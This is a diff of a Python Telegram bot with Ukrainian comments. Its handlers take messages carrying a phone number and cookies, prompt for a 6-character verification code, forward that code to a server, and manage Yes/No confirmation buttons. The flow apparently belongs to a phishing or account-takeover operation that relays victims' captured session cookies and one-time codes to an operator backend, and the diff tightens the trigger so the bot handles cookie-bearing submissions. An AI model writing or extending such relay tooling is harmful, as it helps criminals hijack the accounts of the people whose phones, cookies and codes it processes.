@@ -133,6 +133,9 @@
 #         print(f"ERROR during bot polling: {e}") # Логирование критической ошибки поллинга
 #         # Здесь можно добавить логику перезапуска или уведомления
 #         sys.exit(1) # Выходим с ошибкой, чтобы система (Railway) могла его перезапустить
+# 
+
+
 import os
 import telebot
 import requests
@@ -167,11 +170,13 @@ def send_welcome(message):
     except Exception as e:
         print(f"Error sending welcome: {e}")
 
-# --- 1: Обробка "Новий запит\nТелефон: ..." ---
-@bot.message_handler(func=lambda m: "Новий запит" in m.text and "Телефон:" in m.text)
+# --- Обробка повідомлення з телефоном (форма 1) ---
+@bot.message_handler(func=lambda m: "Телефон:" in m.text and "Кукі:" in m.text)
 def handle_first_form(m):
-    phone_match = re.search(r"Телефон:\s*([+\d\s()-]+)", m.text)
-    phone = phone_match.group(1).strip() if phone_match else None
+    print("➡️ Отримано повідомлення з телефоном")
+
+    match = re.search(r"Телефон:\s*([^\n\r]+)", m.text)
+    phone = match.group(1).strip() if match else None
 
     if not phone:
         bot.reply_to(m, "❌ Не вдалося розпізнати номер.")
@@ -180,7 +185,7 @@ def handle_first_form(m):
     pending_codes[m.chat.id] = phone
     bot.reply_to(m, f"✉️ Введіть 6-значний код для номера {phone}")
 
-# --- 2: Прийом 6-значного коду ---
+# --- Прийом 6-значного коду ---
 @bot.message_handler(func=lambda m: m.chat.id in pending_codes and re.fullmatch(r"[a-zA-Z0-9]{6}", m.text.strip()))
 def handle_code_entry(m):
     phone = pending_codes.pop(m.chat.id)
@@ -202,7 +207,7 @@ def handle_code_entry(m):
         print(f"❌ ERROR sending code to server: {e}")
         bot.reply_to(m, "❌ Не вдалося надіслати код на сервер.")
 
-# --- 3: Обробка "Код підтвердження" + кнопки ---
+# --- Обробка повідомлень з кнопками підтвердження ---
 @bot.message_handler(func=lambda m: isinstance(m.text, str) and "Код підтвердження:" in m.text)
 def handle_code_with_buttons(m):
     print(f"Received code message from chat ID: {m.chat.id}")
@@ -221,7 +226,7 @@ def handle_code_with_buttons(m):
     except Exception as e:
         print(f"Error sending confirmation: {e}")
 
-# --- 4: Кнопки "Так / Ні" ---
+# --- Обробка кнопок Так / Ні ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
 def handle_callback(call):
     print(f"Received callback: {call.data} from chat ID: {call.message.chat.id}")
